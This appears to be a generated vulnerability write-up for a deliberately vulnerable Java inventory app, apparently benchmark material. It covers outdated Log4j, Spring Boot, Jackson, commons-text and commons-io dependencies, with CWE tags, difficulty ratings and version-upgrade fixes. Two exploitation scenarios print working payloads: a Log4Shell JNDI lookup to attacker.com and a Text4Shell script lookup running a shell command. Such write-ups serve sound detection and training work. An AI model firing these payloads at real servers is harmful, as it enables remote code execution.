# Security Companion Document: App.java

## Vulnerability: Log4j 2.14.1 with Remote Code Execution (Log4Shell)

**CWE:** CWE-1104  
**OWASP:** A06  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L13-L14  

### Description
The application depends on log4j-core 2.14.1 and log4j-api 2.14.1 (pinned in pom.xml). This version is vulnerable to CVE-2021-44228 (Log4Shell), one of the most critical vulnerabilities in recent history. The Log4j JNDI lookup feature allows remote code execution when user-controlled data is logged. The application logs user input such as category parameters and order details.

### Exploitation Scenario
An attacker sends a request with a crafted category parameter like `${jndi:ldap://attacker.com/exploit}` to the `/api/products?category=` endpoint. Log4j processes the JNDI lookup string in the log statement at line 68, connecting to the attacker's LDAP server and loading a malicious Java class, achieving remote code execution.

### Remediation Guidance
Update Log4j to version 2.17.1 or later:
```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.21.1</version>
</dependency>
```

### Complexity Rationale
This is rated Obvious because Log4Shell is one of the most widely publicized vulnerabilities. The version 2.14.1 is immediately recognizable as vulnerable.

### Detection Difficulty Rationale
This is rated Easily_Detectable because every dependency scanner and SAST tool flags Log4j versions prior to 2.17.0.

---

## Vulnerability: Outdated Spring Boot 2.5.6 with Multiple CVEs

**CWE:** CWE-1104  
**OWASP:** A06  
**Complexity Level:** Moderate  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L1-L22  

### Description
The application uses Spring Boot 2.5.6 as its parent POM. This version has multiple known vulnerabilities including Spring4Shell (CVE-2022-22965) and other security issues in the Spring Framework. The entire application stack inherits these vulnerabilities.

### Exploitation Scenario
An attacker exploits CVE-2022-22965 (Spring4Shell) by sending crafted requests that manipulate class loader properties through Spring's data binding mechanism, potentially achieving remote code execution on the server.

### Remediation Guidance
Update to a current Spring Boot version:
```xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.2.0</version>
</parent>
```

### Complexity Rationale
This is rated Moderate because Spring Boot version vulnerabilities require understanding the transitive dependency chain and which CVEs affect the specific components used by the application.

### Detection Difficulty Rationale
This is rated Easily_Detectable because dependency scanners flag outdated Spring Boot parent POM versions with known CVEs.

---

## Vulnerability: Jackson Databind 2.12.3 with Deserialization Vulnerabilities

**CWE:** CWE-1104  
**OWASP:** A06  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L8-L9  

### Description
The application pins jackson-databind and jackson-dataformat-xml to version 2.12.3. This version has known deserialization vulnerabilities where polymorphic type handling can be exploited. The application uses both JSON and XML deserialization for inventory import, directly exposing the vulnerable code paths.

### Exploitation Scenario
An attacker sends a crafted JSON or XML payload to the `/api/inventory/import` endpoint that exploits Jackson's polymorphic deserialization. By including type information in the payload, the attacker triggers instantiation of dangerous classes, potentially achieving remote code execution.

### Remediation Guidance
Update Jackson to the latest version:
```xml
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.16.0</version>
</dependency>
```

### Complexity Rationale
This is rated Moderate because Jackson deserialization vulnerabilities depend on whether default typing or polymorphic type handling is enabled, requiring analysis of how the ObjectMapper is configured.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools must correlate the Jackson version with the specific deserialization patterns used in the code to determine exploitability.

---

## Vulnerability: Apache Commons Text 1.9 with String Interpolation RCE

**CWE:** CWE-1104  
**OWASP:** A06  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L10, L155  

### Description
The application uses commons-text 1.9 and its `StringSubstitutor` class for label generation. This version is vulnerable to CVE-2022-42889 (Text4Shell), where the default interpolation includes script, DNS, and URL lookups. User-controlled template strings passed to `StringSubstitutor.replace()` can trigger arbitrary code execution.

### Exploitation Scenario
An attacker sends a request to `/api/products/1/label?template=${script:javascript:java.lang.Runtime.getRuntime().exec('id')}`. The StringSubstitutor processes the script lookup prefix and executes arbitrary JavaScript code on the server.

### Remediation Guidance
Update commons-text and disable dangerous interpolators:
```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-text</artifactId>
    <version>1.11.0</version>
</dependency>
```

### Complexity Rationale
This is rated Nuanced because Text4Shell is less well-known than Log4Shell. The vulnerability requires understanding that StringSubstitutor's default configuration includes dangerous lookup prefixes beyond simple variable substitution.

### Detection Difficulty Rationale
This is rated Likely_Missed because many SAST tools do not have rules for commons-text interpolation vulnerabilities, and the StringSubstitutor API appears to be a simple template engine.

---

## Vulnerability: Apache Commons IO 2.6 with Path Traversal Issues

**CWE:** CWE-1104  
**OWASP:** A06  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L11, L163  

### Description
The application uses commons-io 2.6, which has known vulnerabilities including CVE-2021-29425 related to path traversal in filename utilities. The application uses `FileUtils.writeStringToFile()` for inventory export with a user-controlled path parameter, making the outdated library directly relevant to exploitation.

### Exploitation Scenario
An attacker sends a POST to `/api/inventory/export` with a crafted path that exploits path traversal weaknesses in the commons-io version, writing inventory data to arbitrary filesystem locations.

### Remediation Guidance
Update commons-io:
```xml
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.15.0</version>
</dependency>
```

### Complexity Rationale
This is rated Moderate because the vulnerability requires understanding that the outdated commons-io version has path traversal issues and that the application passes user-controlled paths to its file utilities.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools must correlate the commons-io version with the specific file operation patterns and user-controlled path inputs.
